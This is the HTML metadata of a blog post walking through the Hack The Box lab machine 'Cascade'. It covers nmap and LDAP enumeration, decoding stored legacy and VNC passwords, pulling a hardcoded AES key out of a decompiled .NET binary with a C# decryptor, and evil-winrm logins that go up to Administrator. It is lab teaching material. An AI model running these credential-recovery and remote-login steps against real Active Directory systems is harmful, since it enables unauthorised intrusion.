<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Cascade" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.182 cascade.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ nmap -sV -sT -sC cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 04:22 EDT Nmap scan report for cascade.htb (10.10.10.182) Host is up (0.18s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-10 08:25:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m52s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-10T08:26:15 |_ start_date: 2020-04-10T07:50:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 227.43 seconds Enumeration (1) Seeing that the box belongs to the cascade.local domain, we will append it to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.182 cascade.htb cascade.local Seeing that ldap service is running on port 389, we will use ldapsearch. 1 2 3 $ ldapsearch -x -h cascade.local -b &quot;dc=cascade,dc=local&quot; ... cascadeLegacyPwd: clk0bjVldmE= After eye-balling for a while, I saw a peculiar “cascadeLegacyPwd” which seems to be in `base64. Decoding it reveals “rY4n5eva” This field was under a user called “r.thompson”. Perhaps this password is still being in used? We can use the smb service to verify. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Audit$ NO ACCESS C$ NO ACCESS Default share . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 .. dr--r--r-- 0 Sun Jan 12 20:45:14 2020 Contractors dr--r--r-- 0 Sun Jan 12 20:45:10 2020 Finance dr--r--r-- 0 Tue Jan 28 13:04:51 2020 IT dr--r--r-- 0 Sun Jan 12 20:45:20 2020 Production dr--r--r-- 0 Sun Jan 12 20:45:16 2020 Temps Data READ ONLY IPC$ NO ACCESS Remote IPC . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 .. fr--r--r-- 258 Wed Jan 15 16:50:14 2020 MapAuditDrive.vbs fr--r--r-- 255 Wed Jan 15 16:51:03 2020 MapDataDrive.vbs NETLOGON READ ONLY Logon server share . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 .. dr--r--r-- 0 Thu Jan 9 18:06:29 2020 color dr--r--r-- 0 Thu Jan 9 18:06:29 2020 IA64 dr--r--r-- 0 Thu Jan 9 18:06:29 2020 W32X86 dr--r--r-- 0 Sun Jan 12 22:09:11 2020 x64 print$ READ ONLY Printer Drivers . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 .. dr--r--r-- 0 Thu Jan 9 10:31:27 2020 cascade.local SYSVOL READ ONLY Logon server share As r.thompson, we are only able to read from Data, NETLOGON, print$ and SYSVOL. Time to start digging around! 1 2 3 4 5 6 7 8 9 10 11 12 $ smbclient //cascade.local/Data -U r.thompson Enter WORKGROUP\r.thompson&#39;s password: Try &quot;help&quot; to get a list of possible commands. ... smb: \IT\Temp\s.smith\&gt; dir . D 0 Tue Jan 28 15:00:01 2020 .. D 0 Tue Jan 28 15:00:01 2020 VNC Install.reg A 2680 Tue Jan 28 14:27:44 2020 13106687 blocks of size 4096. 7792770 blocks available smb: \IT\Temp\s.smith\&gt; get &quot;VNC Install.reg&quot; getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec) In \IT\Temp\s.smith\ was a file called VNC Install.reg. After downloading and reading it, we see something interesting. 1 2 3 $ cat &quot;VNC Install.reg&quot; ... &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f This password can be decoded by using msfconsole. 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; irb [*] Starting IRB shell... [*] You are in the &quot;framework&quot; object &gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot; =&gt; &quot;\u0017Rk\u0006#NX\a&quot; &gt;&gt; require &#39;rex/proto/rfb&#39; =&gt; true &gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6BCF2A4B6E5ACA0F&quot;].pack(&#39;H*&#39;), fixedkey =&gt; &quot;sT333ve2&quot; Since the file was found in a directory belonging s.smith, we assume that this is his password. Lets test it out. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2 [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 .. fr--r--r-- 13312 Tue Jan 28 16:47:08 2020 CascAudit.exe fr--r--r-- 12288 Wed Jan 29 13:01:26 2020 CascCrypto.dll dr--r--r-- 0 Tue Jan 28 16:43:18 2020 DB fr--r--r-- 45 Tue Jan 28 18:29:47 2020 RunAudit.bat fr--r--r-- 363520 Tue Jan 28 15:42:18 2020 System.Data.SQLite.dll fr--r--r-- 186880 Tue Jan 28 15:42:18 2020 System.Data.SQLite.EF6.dll dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x64 dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x86 Audit$ READ ONLY ... Using s.smith, we now have access to an additional share Audit$. Wait, we haven’t found user.txt? user.txt Running a second nmap scan but with all ports reveals an additional service we can use: winrm on port 5985. Using evil-winrm, 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u s.smith -p sT333ve2 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type ../Desktop/user.txt 003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Back to the Audit$ share, there were quite a few interesting files. After downloading all the files, I first checked out \DB\Audit.db. 1 2 $ file Audit.db Audit.db: SQLite 3.x database, last written using SQLite version 3027002 Fortunately, Kali Linux comes pre-installed with a SQLite Database browser. After loading Audit.db into the browser, you should see 4 tables. There were mainly 2 interesting tables: DeletedUserAudit: Ldap: It seems like we found a username ArkSvc and its password which appears to be in base64. However, decoding it doesn’t return any readable password. :( The next file I checked was RunAudit.bat. 1 2 $ cat RunAudit.bat CascAudit.exe &quot;\\CASC-DC1\Audit$\DB\Audit.db&quot; Hmm… This batch script is runnig CascAudit.exe and using Audit.db as a command line argument. Perhaps it is writing/reading from it? Lets check out CascAudit.exe next. 1 2 $ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Fortunately, it was written in .NET, meaning we can decompile it to obtain its original source code! I will be transferring CascAudit.exe to my FlareVM, which has ILSpy installed. CascAudit.exe: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... sQLiteConnection.Open(); SQLiteCommand sQLiteCommand = new SQLiteCommand(&quot;SELECT * FROM LDAP&quot;, sQLiteConnection); try { SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader(); try { sQLiteDataReader.Read(); str = Conversions.ToString(sQLiteDataReader[&quot;Uname&quot;]); str2 = Conversions.ToString(sQLiteDataReader[&quot;Domain&quot;]); string encryptedString = Conversions.ToString(sQLiteDataReader[&quot;Pwd&quot;]); try { password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;); } catch (Exception ex) { ProjectData.SetProjectError(ex); Exception ex2 = ex; Console.WriteLine(&quot;Error decrypting password: &quot; + ex2.Message); ProjectData.ClearProjectError(); return; } } ... In this code segment, it is attempting to select records from the LDAP table and decrypt the encrypted string in the “Pwd” column with a hard-coded key c4scadek3y654321. The decrypt function used was from a custom class called Crypto, which was in another file in the Audit$ share called CascCrypto.dll. Opening it up with ILSpy, CascCrypto.dll: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Crypto { public const string DefaultIV = &quot;1tdyjCbY1Ix49842&quot;; public const int Keysize = 128; public static string EncryptString(string Plaintext, string Key) { byte[] bytes = Encoding.UTF8.GetBytes(Plaintext); Aes aes = Aes.Create(); aes.BlockSize = 128; aes.KeySize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Key = Encoding.UTF8.GetBytes(Key); aes.Mode = CipherMode.CBC; using (MemoryStream memoryStream = new MemoryStream()) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) { cryptoStream.Write(bytes, 0, bytes.Length); cryptoStream.FlushFinalBlock(); } return Convert.ToBase64String(memoryStream.ToArray()); } } public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } } To decrypt the encrypted password in the Audit.db, we can simply just make use of the DecryptString method that was already implemented for us. I am not well-versed on how to setup an environment for .NET but I know there are websites like this that allows you run any .NET code ! :) This is how my final code looks like: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 using System; using System.IO; using System.Security.Cryptography; using System.Text; public class Program { public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } public static void Main() { Console.WriteLine(DecryptString(&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;, &quot;c4scadek3y654321&quot;)); } } After executing, we get the output w3lc0meFr31nd. Using evil-winrm again, we establish a shell as ArkSvc. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u ArkSvc -p w3lc0meFr31nd Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Going back to the Data share, there was a file Meeting_Notes_June_2018.html in \IT\Email Archives\: 1 2 3 4 5 6 ... &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; ... Hmm… If we can somehow recover TempAdmin, we might be able to get the password of the Administrator account! Lets see if we can retrieve information about deleted objects! 1 2 3 4 5 6 7 8 9 10 *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#39;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -properties * ... accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin ... Like r.thompson, TempAdmin had a cascadeLegacyPwd, which is baCT3r1aN00dles when decoded! root.txt Using evil-winrm for the final time, we finally get our flag! 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u Administrator -p baCT3r1aN00dles Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.182 cascade.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ nmap -sV -sT -sC cascade.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 04:22 EDT Nmap scan report for cascade.htb (10.10.10.182) Host is up (0.18s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-10 08:25:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m52s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-10T08:26:15 |_ start_date: 2020-04-10T07:50:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 227.43 seconds Enumeration (1) Seeing that the box belongs to the cascade.local domain, we will append it to our /etc/hosts. 1 2 3 $ cat /etc/hosts ... 10.10.10.182 cascade.htb cascade.local Seeing that ldap service is running on port 389, we will use ldapsearch. 1 2 3 $ ldapsearch -x -h cascade.local -b &quot;dc=cascade,dc=local&quot; ... cascadeLegacyPwd: clk0bjVldmE= After eye-balling for a while, I saw a peculiar “cascadeLegacyPwd” which seems to be in `base64. Decoding it reveals “rY4n5eva” This field was under a user called “r.thompson”. Perhaps this password is still being in used? We can use the smb service to verify. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Audit$ NO ACCESS C$ NO ACCESS Default share . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 . dr--r--r-- 0 Tue Jan 28 17:05:51 2020 .. dr--r--r-- 0 Sun Jan 12 20:45:14 2020 Contractors dr--r--r-- 0 Sun Jan 12 20:45:10 2020 Finance dr--r--r-- 0 Tue Jan 28 13:04:51 2020 IT dr--r--r-- 0 Sun Jan 12 20:45:20 2020 Production dr--r--r-- 0 Sun Jan 12 20:45:16 2020 Temps Data READ ONLY IPC$ NO ACCESS Remote IPC . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 . dr--r--r-- 0 Wed Jan 15 16:50:33 2020 .. fr--r--r-- 258 Wed Jan 15 16:50:14 2020 MapAuditDrive.vbs fr--r--r-- 255 Wed Jan 15 16:51:03 2020 MapDataDrive.vbs NETLOGON READ ONLY Logon server share . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 . dr--r--r-- 0 Thu Jan 9 18:06:29 2020 .. dr--r--r-- 0 Thu Jan 9 18:06:29 2020 color dr--r--r-- 0 Thu Jan 9 18:06:29 2020 IA64 dr--r--r-- 0 Thu Jan 9 18:06:29 2020 W32X86 dr--r--r-- 0 Sun Jan 12 22:09:11 2020 x64 print$ READ ONLY Printer Drivers . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 . dr--r--r-- 0 Thu Jan 9 10:31:27 2020 .. dr--r--r-- 0 Thu Jan 9 10:31:27 2020 cascade.local SYSVOL READ ONLY Logon server share As r.thompson, we are only able to read from Data, NETLOGON, print$ and SYSVOL. Time to start digging around! 1 2 3 4 5 6 7 8 9 10 11 12 $ smbclient //cascade.local/Data -U r.thompson Enter WORKGROUP\r.thompson&#39;s password: Try &quot;help&quot; to get a list of possible commands. ... smb: \IT\Temp\s.smith\&gt; dir . D 0 Tue Jan 28 15:00:01 2020 .. D 0 Tue Jan 28 15:00:01 2020 VNC Install.reg A 2680 Tue Jan 28 14:27:44 2020 13106687 blocks of size 4096. 7792770 blocks available smb: \IT\Temp\s.smith\&gt; get &quot;VNC Install.reg&quot; getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec) In \IT\Temp\s.smith\ was a file called VNC Install.reg. After downloading and reading it, we see something interesting. 1 2 3 $ cat &quot;VNC Install.reg&quot; ... &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f This password can be decoded by using msfconsole. 1 2 3 4 5 6 7 8 9 10 $ msfconsole msf5 &gt; irb [*] Starting IRB shell... [*] You are in the &quot;framework&quot; object &gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot; =&gt; &quot;\u0017Rk\u0006#NX\a&quot; &gt;&gt; require &#39;rex/proto/rfb&#39; =&gt; true &gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6BCF2A4B6E5ACA0F&quot;].pack(&#39;H*&#39;), fixedkey =&gt; &quot;sT333ve2&quot; Since the file was found in a directory belonging s.smith, we assume that this is his password. Lets test it out. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2 [+] Finding open SMB ports.... [+] User SMB session established on cascade.local... [+] IP: cascade.local:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 . dr--r--r-- 0 Wed Jan 29 13:01:26 2020 .. fr--r--r-- 13312 Tue Jan 28 16:47:08 2020 CascAudit.exe fr--r--r-- 12288 Wed Jan 29 13:01:26 2020 CascCrypto.dll dr--r--r-- 0 Tue Jan 28 16:43:18 2020 DB fr--r--r-- 45 Tue Jan 28 18:29:47 2020 RunAudit.bat fr--r--r-- 363520 Tue Jan 28 15:42:18 2020 System.Data.SQLite.dll fr--r--r-- 186880 Tue Jan 28 15:42:18 2020 System.Data.SQLite.EF6.dll dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x64 dr--r--r-- 0 Tue Jan 28 15:42:18 2020 x86 Audit$ READ ONLY ... Using s.smith, we now have access to an additional share Audit$. Wait, we haven’t found user.txt? user.txt Running a second nmap scan but with all ports reveals an additional service we can use: winrm on port 5985. Using evil-winrm, 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u s.smith -p sT333ve2 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type ../Desktop/user.txt 003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Back to the Audit$ share, there were quite a few interesting files. After downloading all the files, I first checked out \DB\Audit.db. 1 2 $ file Audit.db Audit.db: SQLite 3.x database, last written using SQLite version 3027002 Fortunately, Kali Linux comes pre-installed with a SQLite Database browser. After loading Audit.db into the browser, you should see 4 tables. There were mainly 2 interesting tables: DeletedUserAudit: Ldap: It seems like we found a username ArkSvc and its password which appears to be in base64. However, decoding it doesn’t return any readable password. :( The next file I checked was RunAudit.bat. 1 2 $ cat RunAudit.bat CascAudit.exe &quot;\\CASC-DC1\Audit$\DB\Audit.db&quot; Hmm… This batch script is runnig CascAudit.exe and using Audit.db as a command line argument. Perhaps it is writing/reading from it? Lets check out CascAudit.exe next. 1 2 $ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Fortunately, it was written in .NET, meaning we can decompile it to obtain its original source code! I will be transferring CascAudit.exe to my FlareVM, which has ILSpy installed. CascAudit.exe: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... sQLiteConnection.Open(); SQLiteCommand sQLiteCommand = new SQLiteCommand(&quot;SELECT * FROM LDAP&quot;, sQLiteConnection); try { SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader(); try { sQLiteDataReader.Read(); str = Conversions.ToString(sQLiteDataReader[&quot;Uname&quot;]); str2 = Conversions.ToString(sQLiteDataReader[&quot;Domain&quot;]); string encryptedString = Conversions.ToString(sQLiteDataReader[&quot;Pwd&quot;]); try { password = Crypto.DecryptString(encryptedString, &quot;c4scadek3y654321&quot;); } catch (Exception ex) { ProjectData.SetProjectError(ex); Exception ex2 = ex; Console.WriteLine(&quot;Error decrypting password: &quot; + ex2.Message); ProjectData.ClearProjectError(); return; } } ... In this code segment, it is attempting to select records from the LDAP table and decrypt the encrypted string in the “Pwd” column with a hard-coded key c4scadek3y654321. The decrypt function used was from a custom class called Crypto, which was in another file in the Audit$ share called CascCrypto.dll. Opening it up with ILSpy, CascCrypto.dll: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class Crypto { public const string DefaultIV = &quot;1tdyjCbY1Ix49842&quot;; public const int Keysize = 128; public static string EncryptString(string Plaintext, string Key) { byte[] bytes = Encoding.UTF8.GetBytes(Plaintext); Aes aes = Aes.Create(); aes.BlockSize = 128; aes.KeySize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Key = Encoding.UTF8.GetBytes(Key); aes.Mode = CipherMode.CBC; using (MemoryStream memoryStream = new MemoryStream()) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) { cryptoStream.Write(bytes, 0, bytes.Length); cryptoStream.FlushFinalBlock(); } return Convert.ToBase64String(memoryStream.ToArray()); } } public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } } To decrypt the encrypted password in the Audit.db, we can simply just make use of the DecryptString method that was already implemented for us. I am not well-versed on how to setup an environment for .NET but I know there are websites like this that allows you run any .NET code ! :) This is how my final code looks like: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 using System; using System.IO; using System.Security.Cryptography; using System.Text; public class Program { public static string DecryptString(string EncryptedString, string Key) { //Discarded unreachable code: IL_009e byte[] array = Convert.FromBase64String(EncryptedString); Aes aes = Aes.Create(); aes.KeySize = 128; aes.BlockSize = 128; aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;); aes.Mode = CipherMode.CBC; aes.Key = Encoding.UTF8.GetBytes(Key); using (MemoryStream stream = new MemoryStream(array)) { using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read)) { byte[] array2 = new byte[checked(array.Length - 1 + 1)]; cryptoStream.Read(array2, 0, array2.Length); return Encoding.UTF8.GetString(array2); } } } public static void Main() { Console.WriteLine(DecryptString(&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;, &quot;c4scadek3y654321&quot;)); } } After executing, we get the output w3lc0meFr31nd. Using evil-winrm again, we establish a shell as ArkSvc. 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u ArkSvc -p w3lc0meFr31nd Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Going back to the Data share, there was a file Meeting_Notes_June_2018.html in \IT\Email Archives\: 1 2 3 4 5 6 ... &lt;p&gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt; ... Hmm… If we can somehow recover TempAdmin, we might be able to get the password of the Administrator account! Lets see if we can retrieve information about deleted objects! 1 2 3 4 5 6 7 8 9 10 *Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#39;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -properties * ... accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin ... Like r.thompson, TempAdmin had a cascadeLegacyPwd, which is baCT3r1aN00dles when decoded! root.txt Using evil-winrm for the final time, we finally get our flag! 1 2 3 4 5 6 7 $ ruby evil-winrm.rb -i cascade.local -u Administrator -p baCT3r1aN00dles Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/cascade-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/cascade-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-26T13:28:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Cascade" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/cascade-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.182 